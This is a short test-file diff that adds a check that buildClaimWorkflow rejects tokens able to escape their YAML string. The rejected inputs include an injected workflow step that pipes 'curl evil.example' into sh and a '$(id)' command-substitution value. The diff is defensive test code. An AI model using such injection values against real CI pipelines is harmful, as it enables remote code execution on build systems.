@@ -17,3 +17,12 @@ describe('buildClaimWorkflow', () => {
     expect(() => buildClaimWorkflow('invalid')).toThrow()
   })
 })
+
+describe('buildClaimWorkflow refuses a token that could escape its YAML string', () => {
+  it('accepts real tokens and refuses quotes, newlines and anything outside [A-Za-z0-9_-]', () => {
+    expect(buildClaimWorkflow('clm_0123456789abcdef0123456789abcdef')).toContain("tenant: 'clm_0123456789abcdef0123456789abcdef'")
+    for (const bad of ["clm_x'\n      - run: curl evil.example | sh", 'clm_x\ny: 1', 'clm_a b', 'clm_', `clm_${'a'.repeat(200)}`, 'clm_$(id)']) {
+      expect(() => buildClaimWorkflow(bad), bad).toThrow()
+    }
+  })
+})
